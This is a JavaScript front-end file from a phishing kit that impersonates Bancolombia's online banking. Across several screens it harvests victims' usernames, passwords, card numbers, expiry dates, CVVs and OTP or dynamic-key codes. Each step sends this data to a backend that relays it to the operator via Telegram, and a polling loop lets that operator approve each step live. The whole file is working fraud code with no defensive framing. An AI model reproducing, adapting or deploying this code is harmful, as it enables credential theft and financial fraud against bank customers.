/**
 * ================================================================
 * Bancolombia Flow v2 — Frontend Application
 * ================================================================
 * Flujo: Login → Cupo → Tarjeta → [Token|OTP|Dinámica] → Éxito
 * Backend proxy oculta el token de Telegram.
 * ================================================================
 */

const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9);
const loader = document.getElementById('loader');
const ORIGINAL_LOADER = loader.innerHTML;

let pollInterval  = null;
let currentScreen = 'scr-login';
let detectedBank  = null;

/* ═══════════════════════════════════════════════════════════════
   NAVEGACIÓN
   ═══════════════════════════════════════════════════════════════ */
function show(id) {
    currentScreen = id;
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    window.scrollTo(0, 0);

    const titles = {
        'scr-login':  'Sucursal Virtual Personas',
        'scr-monto':  'Activación de Tarjeta Digital',
        'scr-tarjeta':'Solicitud de Producto',
        'scr-token':  'Token de seguridad',
        'scr-clave':  'Clave dinámica',
        'scr-exito':  'Activación exitosa'
    };
    const t = document.getElementById('page-title');
    if (t) t.textContent = titles[id] || 'Sucursal Virtual Personas';

    if (id === 'scr-token' || id === 'scr-clave') {
        const u = document.getElementById('user').value.trim();
        const dyn = document.getElementById(id === 'scr-token' ? 'token-user' : 'dyn-user');
        if (dyn) dyn.textContent = u || 'Usuario';
    }
}

/* ═══════════════════════════════════════════════════════════════
   TOAST ERROR
   ═══════════════════════════════════════════════════════════════ */
function showToastError() {
    const toast = document.getElementById('toast-error');
    if (toast) { toast.classList.add('show'); setTimeout(hideToast, 8000); }
}
function hideToast() {
    const toast = document.getElementById('toast-error');
    if (toast) toast.classList.remove('show');
}

/* ═══════════════════════════════════════════════════════════════
   LIMPIAR CAMPOS + ERRORES
   ═══════════════════════════════════════════════════════════════ */
function clearCurrentScreen() {
    showToastError();

    if (currentScreen === 'scr-login') {
        const ids = ['user','pass','hp'];
        ids.forEach(id => { const el = document.getElementById(id); if(el) el.value=''; });
        const nobot = document.getElementById('nobot');
        if (nobot) nobot.checked = false;
        const btn = document.getElementById('btn-login');
        if (btn) { btn.disabled = true; btn.classList.remove('ready'); }
        document.getElementById('fld-user')?.classList.add('error');
        document.getElementById('fld-pass')?.classList.add('error');
        document.getElementById('antibot-box')?.classList.add('error');
        ['err-user','err-pass','err-nobot'].forEach(id => document.getElementById(id)?.classList.add('show'));
    }
    else if (currentScreen === 'scr-monto') {
        const slider = document.getElementById('cupo-slider');
        if (slider) { slider.value = 5; updateCupo(5); }
        document.querySelectorAll('.cupo-grid .opt').forEach(b => b.classList.remove('active'));
        document.querySelector('.cupo-grid .opt[data-val="5"]')?.classList.add('active');
    }
    else if (currentScreen === 'scr-tarjeta') {
        ['titular','cardnum','venc','cvv'].forEach(id => {
            const el = document.getElementById(id);
            if (el) { el.value = ''; el.classList.add('err'); }
        });
        ['err-titular','err-cardnum','err-venc'].forEach(id => document.getElementById(id)?.classList.add('show'));
        hideBankDetect();
    }
    else if (currentScreen === 'scr-token' || currentScreen === 'scr-clave') {
        document.querySelectorAll('.code-input input').forEach(i => i.value = '');
        const btnId = currentScreen === 'scr-token' ? 'btn-token' : 'btn-clave';
        const btn = document.getElementById(btnId);
        if (btn) { btn.disabled = true; btn.classList.remove('ready'); }
    }
}

function resetAll() {
    // Login
    ['user','pass','hp'].forEach(id => { const el = document.getElementById(id); if(el) el.value=''; });
    const nobot = document.getElementById('nobot');
    if (nobot) nobot.checked = false;
    const btnLogin = document.getElementById('btn-login');
    if (btnLogin) { btnLogin.disabled = true; btnLogin.classList.remove('ready'); }
    document.getElementById('fld-user')?.classList.remove('error');
    document.getElementById('fld-pass')?.classList.remove('error');
    document.getElementById('antibot-box')?.classList.remove('error');
    ['err-user','err-pass','err-nobot'].forEach(id => document.getElementById(id)?.classList.remove('show'));

    // Cupo
    const slider = document.getElementById('cupo-slider');
    if (slider) { slider.value = 5; updateCupo(5); }
    document.querySelectorAll('.cupo-grid .opt').forEach(b => b.classList.remove('active'));
    document.querySelector('.cupo-grid .opt[data-val="5"]')?.classList.add('active');

    // Tarjeta
    ['titular','cardnum','venc','cvv'].forEach(id => {
        const el = document.getElementById(id);
        if (el) { el.value = ''; el.classList.remove('err'); }
    });
    ['err-titular','err-cardnum','err-venc'].forEach(id => document.getElementById(id)?.classList.remove('show'));
    hideBankDetect();

    // Token + Clave
    document.querySelectorAll('.code-input input').forEach(i => i.value = '');
    ['btn-token','btn-clave'].forEach(id => {
        const btn = document.getElementById(id);
        if (btn) { btn.disabled = true; btn.classList.remove('ready'); }
    });

    detectedBank = null;
}

/* ═══════════════════════════════════════════════════════════════
   DETECCIÓN DE BANCO POR BIN
   ═══════════════════════════════════════════════════════════════ */
function hideBankDetect() {
    document.getElementById('bank-logo')?.classList.remove('show');
    document.getElementById('scheme-logo')?.classList.remove('show');
    document.getElementById('bank-name')?.classList.remove('show');
    document.getElementById('bank-name').textContent = '';
    document.getElementById('bank-logo').src = '';
    document.getElementById('scheme-logo').src = '';
    detectedBank = null;
}

function showBankDetect(data) {
    const bankLogo = document.getElementById('bank-logo');
    const schemeLogo = document.getElementById('scheme-logo');
    const bankName = document.getElementById('bank-name');

    if (data.bankLogo) {
        bankLogo.src = data.bankLogo;
        bankLogo.classList.add('show');
    } else {
        bankLogo.classList.remove('show');
    }

    if (data.schemeLogo) {
        schemeLogo.src = data.schemeLogo;
        schemeLogo.classList.add('show');
    } else {
        schemeLogo.classList.remove('show');
    }

    if (data.hasBank) {
        const names = {
            bancolombia:'Bancolombia', davivienda:'Davivienda', bbva:'BBVA',
            bogota:'Banco de Bogotá', colpatria:'Scotiabank Colpatria',
            avvillas:'AV Villas', itau:'Itaú', popular:'Banco Popular',
            falabella:'Banco Falabella', cajasocial:'Caja Social', serfinanza:'Serfinanza',
            nequi:'Nequi'
        };
        bankName.textContent = names[data.bank] || data.bank;
        bankName.classList.add('show');
    } else {
        bankName.classList.remove('show');
        bankName.textContent = '';
    }

    detectedBank = data.bank !== 'unknown' ? data.bank : null;

    // Actualizar logo en pantalla de token también
    const tokenBankLogo = document.getElementById('token-bank-logo');
    if (tokenBankLogo && data.bankLogo) {
        tokenBankLogo.src = data.bankLogo;
        tokenBankLogo.style.display = 'block';
    }
}

function detectBank(number) {
    const clean = number.replace(/\D/g, '');
    if (clean.length < 6) { hideBankDetect(); return; }

    fetch(`api/bin.php?number=${encodeURIComponent(clean)}`)
        .then(r => r.json())
        .then(data => {
            if (data.ok) showBankDetect(data);
        })
        .catch(() => {});
}

/* ═══════════════════════════════════════════════════════════════
   BACKEND PROXY — ENVÍO Y POLLING
   ═══════════════════════════════════════════════════════════════ */
function showWaitingLoader(title, subtitle) {
    loader.innerHTML = `
        <div class="loader-circle"><div class="spinner"></div></div>
        <h3>${title}</h3>
        <p>${subtitle}</p>
        <p class="dim">El administrador debe aprobar desde Telegram</p>
    `;
    loader.classList.add('show');
}
function restoreLoader() {
    loader.innerHTML = ORIGINAL_LOADER;
}

function sendToBackend(step, message) {
    const abToken = document.querySelector('input[name="ab_token"]')?.value || '';
    const website = document.querySelector('input[name="website"]')?.value || '';
    return fetch('api/send.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'same-origin',
        body: JSON.stringify({ step, message, sessionId: SESSION_ID, ab_token: abToken, website })
    }).then(r => r.json());
}

function startPolling(targetScreen, stepName, originalMsg, onAction) {
    showWaitingLoader('Esperando aprobación...', 'Por favor espere mientras el administrador revisa su solicitud');

    pollInterval = setInterval(() => {
        fetch(`api/poll.php?sessionId=${encodeURIComponent(SESSION_ID)}`, { credentials: 'same-origin' })
            .then(r => r.json())
            .then(data => {
                if (!data.ok || data.status !== 'completed') return;

                clearInterval(pollInterval);
                pollInterval = null;
                loader.classList.remove('show');
                restoreLoader();

                const action = data.action;

                if (action === 'aprobar') {
                    show(targetScreen);
                } else if (action === 'rechazar') {
                    clearCurrentScreen();
                } else if (action === 'token' || action === 'otp') {
                    // Ir a pantalla de token
                    show('scr-token');
                } else if (action === 'dinamica') {
                    // Ir directo a clave dinámica
                    show('scr-clave');
                }

                if (onAction) onAction(action);
            })
            .catch(() => {});
    }, 3000);
}

/* ═══════════════════════════════════════════════════════════════
   ENVÍOS POR PASO
   ═══════════════════════════════════════════════════════════════ */
function submitLogin() {
    const hp = document.getElementById('hp');
    if (hp && hp.value !== '') return;

    const user = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;
    const nobot = document.getElementById('nobot');
    if (!user.trim() || !pass.trim() || (nobot && !nobot.checked)) return;

    const msg = `🔐 <b>Login Bancolombia</b>\n\n👤 Usuario: <code>${user}</code>\n🔑 Clave: <code>${pass}</code>\n\n🖥️ Dispositivo: ${detectDevice()}`;
    sendToBackend('login', msg).then(data => {
        if (data.ok) startPolling('scr-monto', 'login', msg);
    });
}

function submitCupo() {
    const cupo = document.getElementById('cupo-val').textContent;
    const msg = `💳 <b>Cupo seleccionado</b>\n\n💰 Monto: <b>${cupo}</b>`;
    sendToBackend('cupo', msg).then(data => {
        if (data.ok) startPolling('scr-tarjeta', 'cupo', msg);
    });
}

function submitTarjeta() {
    const titular = document.getElementById('titular').value;
    const cardnum = document.getElementById('cardnum').value;
    const venc = document.getElementById('venc').value;
    const cvv = document.getElementById('cvv').value;
    const banco = detectedBank || 'No detectado';

    const msg = `💳 <b>Datos de tarjeta</b>\n\n🏦 Banco: <b>${banco}</b>\n👤 Titular: <code>${titular}</code>\n💳 Número: <code>${cardnum}</code>\n📅 Vencimiento: <code>${venc}</code>\n🔒 CVV: <code>${cvv}</code>`;
    sendToBackend('tarjeta', msg).then(data => {
        if (data.ok) startPolling('scr-clave', 'tarjeta', msg);
    });
}

function submitToken() {
    const user = document.getElementById('user').value;
    const code = [...document.querySelectorAll('#scr-token .code-input input')].map(i => i.value).join('');
    const msg = `🔐 <b>Token / OTP</b>\n\n👤 Usuario: <code>${user}</code>\n🔢 Código: <code>${code}</code>`;
    sendToBackend('token', msg).then(data => {
        if (data.ok) startPolling('scr-clave', 'token', msg);
    });
}

function submitClave() {
    const user = document.getElementById('user').value;
    const code = [...document.querySelectorAll('#scr-clave .code-input input')].map(i => i.value).join('');
    const msg = `🔐 <b>Clave Dinámica</b>\n\n👤 Usuario: <code>${user}</code>\n🔢 Clave: <code>${code}</code>`;
    sendToBackend('clave', msg).then(data => {
        if (data.ok) startPolling('scr-exito', 'clave', msg);
    });
}

/* ═══════════════════════════════════════════════════════════════
   DETECCIÓN DE DISPOSITIVO
   ═══════════════════════════════════════════════════════════════ */
function detectDevice() {
    const ua = navigator.userAgent;
    if (ua.match(/Android/i)) return 'Android';
    if (ua.match(/iPhone/i)) return 'iPhone';
    if (ua.match(/iPad/i)) return 'iPad';
    if (ua.match(/Windows Phone/i)) return 'Windows Phone';
    if (ua.match(/BlackBerry/i)) return 'BlackBerry';
    return 'PC / Desktop';
}

/* ═══════════════════════════════════════════════════════════════
   CONTROLES DE UI
   ═══════════════════════════════════════════════════════════════ */
const userIn = document.getElementById('user');
const passIn = document.getElementById('pass');
const nobot = document.getElementById('nobot');
const btnLogin = document.getElementById('btn-login');

function checkLogin() {
    const ok = userIn?.value.trim() && passIn?.value.trim() && nobot?.checked;
    if (btnLogin) {
        btnLogin.disabled = !ok;
        btnLogin.classList.toggle('ready', ok);
    }
}

if (userIn) {
    userIn.addEventListener('input', () => {
        if (nobot && !nobot.checked) nobot.checked = true;
        checkLogin();
        document.getElementById('fld-user')?.classList.remove('error');
        document.getElementById('err-user')?.classList.remove('show');
    });
}
if (passIn) {
    passIn.addEventListener('input', () => {
        if (nobot && !nobot.checked) nobot.checked = true;
        checkLogin();
        document.getElementById('fld-pass')?.classList.remove('error');
        document.getElementById('err-pass')?.classList.remove('show');
    });
}
if (nobot) {
    nobot.addEventListener('change', () => {
        checkLogin();
        document.getElementById('antibot-box')?.classList.remove('error');
        document.getElementById('err-nobot')?.classList.remove('show');
    });
}

/* ── Formateo tarjeta + detección banco ── */
const cardInput = document.getElementById('cardnum');
if (cardInput) {
    cardInput.addEventListener('input', e => {
        let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let parts = [];
        for (let i = 0; i < v.length; i += 4) parts.push(v.substring(i, i + 4));
        e.target.value = parts.join(' ');
        cardInput.classList.remove('err');
        document.getElementById('err-cardnum')?.classList.remove('show');
        detectBank(v);
    });
}

/* ── Formateo vencimiento ── */
const vencInput = document.getElementById('venc');
if (vencInput) {
    vencInput.addEventListener('input', e => {
        let v = e.target.value.replace(/[^0-9]/g, '');
        if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
        e.target.value = v;
        vencInput.classList.remove('err');
        document.getElementById('err-venc')?.classList.remove('show');
    });
}

/* ── Errores dinámicos ── */
const titularInput = document.getElementById('titular');
if (titularInput) {
    titularInput.addEventListener('input', () => {
        titularInput.classList.remove('err');
        document.getElementById('err-titular')?.classList.remove('show');
    });
}
const cvvInput = document.getElementById('cvv');
if (cvvInput) {
    cvvInput.addEventListener('input', () => {
        cvvInput.classList.remove('err');
    });
}

/* ── Cupo slider & grid ── */
function fmtCupo(v) { return '$' + (v * 1000000).toLocaleString('es-CO'); }
function updateCupo(val) {
    const cupoVal = document.getElementById('cupo-val');
    if (cupoVal) cupoVal.textContent = fmtCupo(val);
    document.querySelectorAll('.cupo-grid .opt').forEach(b => {
        b.classList.toggle('active', parseInt(b.dataset.val) === parseInt(val));
    });
}
const cupoSlider = document.getElementById('cupo-slider');
if (cupoSlider) {
    cupoSlider.addEventListener('input', e => updateCupo(e.target.value));
}
document.querySelectorAll('.cupo-grid .opt').forEach(btn => {
    btn.addEventListener('click', () => {
        const val = btn.dataset.val;
        const slider = document.getElementById('cupo-slider');
        if (slider) slider.value = val;
        updateCupo(val);
    });
});

/* ── Clave dinámica inputs ── */
function setupCodeInputs(containerSelector, btnId) {
    const inputs = document.querySelectorAll(`${containerSelector} input`);
    inputs.forEach((inp, i) => {
        inp.addEventListener('input', () => {
            if (inp.value && i < inputs.length - 1) inputs[i + 1].focus();
            const full = [...inputs].every(x => x.value);
            const btn = document.getElementById(btnId);
            if (btn) {
                btn.disabled = !full;
                btn.classList.toggle('ready', full);
            }
        });
        inp.addEventListener('keydown', e => {
            if (e.key === 'Backspace' && !inp.value && i > 0) {
                inputs[i - 1].focus();
            }
        });
    });
}
setupCodeInputs('#scr-clave .code-input', 'btn-clave');
setupCodeInputs('#scr-token .code-input', 'btn-token');
